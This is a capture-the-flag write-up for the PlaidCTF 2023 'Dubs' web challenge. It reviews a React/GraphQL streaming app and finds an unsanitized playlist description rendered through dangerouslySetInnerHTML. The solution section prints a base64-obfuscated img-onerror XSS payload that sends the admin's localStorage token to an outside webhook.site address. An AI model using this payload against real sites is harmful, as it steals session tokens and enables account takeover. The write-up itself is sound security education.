---
title: PlaidCTF 2023 - Davy Jones' Putlocker - web - part 1
published: true
---

# PlaidCTF 2023 - Davy Jones' Putlocker - web - part 1

> justCatTheFish write-up

## Challenge meta

- Name: **Dubs**
- Solves: **67**
- Reward: **350**
- Description: 
> When I not be plunderin' the high seas, I be watchin' me favorite shows. Like any self-respectin' pirate, I don't be payin' for my media. But I'll be honest, this site even be a bit shady for me. (Note: PPP does not condone media piracy)
- tl;dr: easiest xss possible
- challenge files are available [here](https://github.com/tomek7667/hacker-blog/raw/master/challenge_files/putlocker-dubs.5e6b76f24e3bffdbeed8d44a288cb4157a5b6a7fd574311119c496bb5fefed0b.tar.gz)

## Challenge story

The website is a streaming platform where any user can create episodes, shows and playlists and later view them. 

We were given following files *(thanks bluepichu)*:

```
.
├── docker-compose.yml
├── misc
│   └── init.sql
├── package.json
├── packages
│   ├── client
│   │   ├── assets
│   │   │   ├── plaidplus.png
│   │   │   └── star.png
│   │   ├── Dockerfile
│   │   ├── index.html
│   │   ├── nginx.conf
│   │   ├── package.json
│   │   ├── public
│   │   │   ├── brilliant-beetle.png
│   │   │   ├── eternal-cruise.png
│   │   │   ├── mermaidsea.png
│   │   │   ├── over-the-deck-rail.png
│   │   │   └── the-seagulls-nest.png
│   │   ├── src
│   │   │   ├── apollo.tsx
│   │   │   ├── components
│   │   │   │   ├── AddToPlaylistButton
│   │   │   │   │   ├── AddToPlaylistButton.module.scss
│   │   │   │   │   ├── AddToPlaylistButton.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── EnsureAdmin
│   │   │   │   │   ├── EnsureAdmin.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── EnsureLoggedIn
│   │   │   │   │   ├── EnsureLoggedIn.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── EpisodePanel
│   │   │   │   │   ├── EpisodePanel.module.scss
│   │   │   │   │   ├── EpisodePanel.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── Footer
│   │   │   │   │   ├── Footer.module.scss
│   │   │   │   │   ├── Footer.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── GenresSelector
│   │   │   │   │   ├── GenresSelector.module.scss
│   │   │   │   │   ├── GenresSelector.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── Header
│   │   │   │   │   ├── Header.module.scss
│   │   │   │   │   ├── Header.tsx
│   │   │   │   │   └── index.tsx
│   │   │   │   ├── Panel
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── Panel.module.scss
│   │   │   │   │   └── Panel.tsx
│   │   │   │   ├── Promo
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── Promo.module.scss
│   │   │   │   │   └── Promo.tsx
│   │   │   │   ├── Rating
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── Rating.module.scss
│   │   │   │   │   └── Rating.tsx
│   │   │   │   ├── ReportButton
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── ReportButton.module.scss
│   │   │   │   │   └── ReportButton.tsx
│   │   │   │   ├── UpsertEpisodePanel
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── UpsertEpisodePanel.module.scss
│   │   │   │   │   └── UpsertEpisodePanel.tsx
│   │   │   │   ├── UpsertPlaylistPanel
│   │   │   │   │   ├── index.tsx
│   │   │   │   │   ├── UpsertPlaylistPanel.module.scss
│   │   │   │   │   └── UpsertPlaylistPanel.tsx
│   │   │   │   └── UpsertShowPanel
│   │   │   │       ├── index.tsx
│   │   │   │       ├── UpsertShowPanel.module.scss
│   │   │   │       └── UpsertShowPanel.tsx
│   │   │   ├── index.scss
│   │   │   ├── index.tsx
│   │   │   ├── utils
│   │   │   │   ├── css.tsx
│   │   │   │   ├── gql.tsx
│   │   │   │   ├── qs.tsx
│   │   │   │   └── uuid.tsx
│   │   │   └── views
│   │   │       ├── BaseView
│   │   │       │   ├── BaseView.module.scss
│   │   │       │   ├── BaseView.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── CreateEpisode
│   │   │       │   ├── CreateEpisode.module.scss
│   │   │       │   ├── CreateEpisode.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── CreatePlaylist
│   │   │       │   ├── CreatePlaylist.module.scss
│   │   │       │   ├── CreatePlaylist.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── CreateShow
│   │   │       │   ├── CreateShow.module.scss
│   │   │       │   ├── CreateShow.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── EditEpisode
│   │   │       │   ├── EditEpisode.module.scss
│   │   │       │   ├── EditEpisode.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── EditShow
│   │   │       │   ├── EditShow.module.scss
│   │   │       │   ├── EditShow.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── Episode
│   │   │       │   ├── Episode.module.scss
│   │   │       │   ├── Episode.tsx
│   │   │       │   └── index.tsx
│   │   │       ├── Genre
│   │   │       │   ├── Genre.module.scss
│   │   │       │   ├── Genre.tsx
│   │   │       │   ├── index.tsx
│   │   │       │   ├── ShowsPanel.module.scss
│   │   │       │   └── ShowsPanel.tsx
│   │   │       ├── Home
│   │   │       │   ├── FeaturedPanel.module.scss
│   │   │       │   ├── FeaturedPanel.tsx
│   │   │       │   ├── Home.module.scss
│   │   │       │   ├── Home.tsx
│   │   │       │   ├── index.tsx
│   │   │       │   ├── OngoingPanel.module.scss
│   │   │       │   ├── OngoingPanel.tsx
│   │   │       │   ├── RecentPanel.module.scss
│   │   │       │   └── RecentPanel.tsx
│   │   │       ├── Login
│   │   │       │   ├── index.tsx
│   │   │       │   ├── Login.module.scss
│   │   │       │   ├── LoginPanel.module.scss
│   │   │       │   ├── LoginPanel.tsx
│   │   │       │   └── Login.tsx
│   │   │       ├── Playlist
│   │   │       │   ├── index.tsx
│   │   │       │   ├── Playlist.module.scss
│   │   │       │   └── Playlist.tsx
│   │   │       ├── Register
│   │   │       │   ├── index.tsx
│   │   │       │   ├── Register.module.scss
│   │   │       │   ├── RegisterPanel.module.scss
│   │   │       │   ├── RegisterPanel.tsx
│   │   │       │   └── Register.tsx
│   │   │       ├── Show
│   │   │       │   ├── EpisodesPanel.module.scss
│   │   │       │   ├── EpisodesPanel.tsx
│   │   │       │   ├── index.tsx
│   │   │       │   ├── InfoPanel.module.scss
│   │   │       │   ├── InfoPanel.tsx
│   │   │       │   ├── RecentPanel.module.scss
│   │   │       │   ├── RecentPanel.tsx
│   │   │       │   ├── Show.module.scss
│   │   │       │   └── Show.tsx
│   │   │       └── User
│   │   │           ├── index.tsx
│   │   │           ├── User.module.scss
│   │   │           ├── UserPlaylistsPanel.module.scss
│   │   │           ├── UserPlaylistsPanel.tsx
│   │   │           ├── UserShowsPanel.module.scss
│   │   │           ├── UserShowsPanel.tsx
│   │   │           └── User.tsx
│   │   ├── tsconfig.json
│   │   └── vite.config.mjs
│   └── server
│       ├── build.mjs
│       ├── Dockerfile
│       ├── package.json
│       ├── README.md
│       ├── src
│       │   ├── auth.mts
│       │   ├── context.mts
│       │   ├── db.mts
│       │   ├── index.mts
│       │   ├── jwt.mts
│       │   ├── renderHtml.mts
│       │   ├── report.mts
│       │   ├── sql.mts
│       │   └── types.mts
│       └── tsconfig.json
├── README.md
├── tsconfig.base.json
├── tsconfig.dom.json
├── tsconfig.node.json
├── turbo.json
└── yarn.lock
```

# Architecture overview

The front-end is written using [React](https://react.dev/) framework with the use of [`@apollo/client` *(React)*](https://www.npmjs.com/package/@apollo/client), and the back-end is written in typescript with the use of [`@apollo/server`](https://www.npmjs.com/package/@apollo/server).

The [`apollo`](https://www.apollographql.com/docs/) libraries allow good communication between the server and the client when basing on a [GraphQL](https://www.youtube.com/watch?v=eIQh02xuVw4) database, which in the case of the challenge, was the main data source.

# Challenge part

Warning! This challenge is incredibly beginner friendly, as this is a baby XSS!

## Where's the flag?

The **flag** can be fetched using a graphql query:

`packages/server/src/index.mts`

```typescript
flag: async (
	_: {},
	args: {},
	context: Context
) => {
	assertLoggedIn(context);
	await assertAdmin(context);

	return Flag;
}
```


that will return the **flag** if those 2 conditions are satisfied:

`packages/server/src/auth.mts`:
```typescript
export function assertLoggedIn(context: Context): asserts context is { user: string } {
	if (context.user === undefined) {
		throw new Error("Not logged in");
	}
}

export async function assertAdmin(context: Context & { user: string }) {
	const user = await loadUser(context.user);

	if (user.name !== "admin") {
		throw new Error("Not authorized");
	}
}
```

The `Context` is a simple interface
`packages/server/src/context.mts`:
```typescript
export interface Context {
	user?: string;
}
```

That is extracted from the authorization header.
`packages/server/src/index.mts`:

```typescript
startStandaloneServer(server, {
	listen: {
		port: 80
	},
	// eslint-disable-next-line @typescript-eslint/require-await
	context: async ({ req }): Promise<Context> => {
		const token = req.headers.authorization;

		if (token === undefined) {
			return {};
		}

		try {
			const user = verifyUserToken(token);
			return { user };
		} catch (e) {
			return {};
		}
	}
});
```

## Access to admin token

We can report any `url` via graphql query:

```typescript
report: async (_: {}, args: { url: string }) => {
	await checkUrl(args.url);
	return true;
},
```

then the `checkUrl` function will do the following:
1. Throw an error if our `url` does not meet the condition: `!url.startsWith("http://") && !url.startsWith("https://")`
2. Go to website login page and log in to an **admin account**
3. Close the login page
4. Navigate to the given `url`
5. Wait 10 seconds
6. Close the page

A pretty standard scenario to look for [XSS](https://portswigger.net/web-security/cross-site-scripting).

We will be able to read the **flag** if we manage to do either:
- Steal the `authorization` token and log in as admin
- Force an admin to fetch **flag** query and return response to our [webhook](https://www.redhat.com/en/topics/automation/what-is-a-webhook) website.

We have solved it using the first way, as the token was stored in a localstorage, so it's an easy way to access it with XSS.
```typescript
// packages/client/src/views/Login/LoginPanel.tsx
localStorage.setItem("token", result.data.login);
...
// packages/client/src/views/Register/RegisterPanel.tsx
localStorage.setItem("token", result.data.register);
```

## Finding XSS

To find the XSS it was enough to search for React's version for setting the `innerHTML` property which is conveniently called `dangerouslySetInnerHTML`:

![](https://i.imgur.com/bscDGQd.png)

After a quick look, the user playlist panel had the playlist description, which was controlled by us,

`packages/client/src/views/User/UserPlaylistsPanel.tsx`

```typescript
<div
	className={styles.description}
	dangerouslySetInnerHTML={{ __html: playlist.description }}
/>
```
and not sanitized by backend's `renderHtml` sanitization function, wrapping the [`micromark`](https://www.npmjs.com/package/micromark) parser library, which if not explicitly set, will do any XSS escape.

`packages/server/src/renderHtml.mts`
```typescript
import { micromark } from "micromark";

export function renderHtml(content: string): string {
	return micromark(content);
}
```

`Show` and `Episode` descriptions were sanitized:

![](https://i.imgur.com/KqBgu8o.png)

But the `playlist`'s description wasn't, it directly called the database:

![](https://i.imgur.com/sBYk6OY.png)

## Solution preparation

Now we have everything to get the flag. Let's create an XSS on the playlist description that will that will execute following javascript:

```javascript
navigator.sendBeacon("https://webhook.site/8174d521-9d17-4770-8330-7b6018d510cb", window.localStorage.token)
```

Now we can `btoa` our JS to make it execute on eval:

```javascript
btoa(`navigator.sendBeacon("https://webhook.site/777a0f22-84c4-4e6c-8905-35bb90a187fc", window.localStorage.token)`)
// out: 'bmF2aWdhdG9yLnNlbmRCZWFjb24oImh0dHBzOi8vd2ViaG9vay5zaXRlLzc3N2EwZjIyLTg0YzQtNGU2Yy04OTA1LTM1YmI5MGExODdmYyIsIHdpbmRvdy5sb2NhbFN0b3JhZ2UudG9rZW4p'
```

And we have our final payload using standard `img` xss, which firstly decodes the JS from base64, and `eval`s it:

```html
<img src=x onerror=eval(atob("bmF2aWdhdG9yLnNlbmRCZWFjb24oImh0dHBzOi8vd2ViaG9vay5zaXRlLzc3N2EwZjIyLTg0YzQtNGU2Yy04OTA1LTM1YmI5MGExODdmYyIsIHdpbmRvdy5sb2NhbFN0b3JhZ2UudG9rZW4p"))>
```

---

## Putting all together

0. Registering a new user:

![](https://i.imgur.com/LmJvV8Z.png)


1. Creating the playlist with payload description:

![](https://i.imgur.com/hutqUIH.png)


2. Verifying whether the webhook works for us by going to our users page:

![](https://i.imgur.com/sYGLkwS.png)

as you can see, we got the token in the webhook after entering the users page, so *it works on my machine*, and so should work when reported the users page to the admin bot.

After the cookie is sent to us, we can make a graphql query for the flag using the admin token as authorization header.

![](https://i.imgur.com/AskJCfy.png)
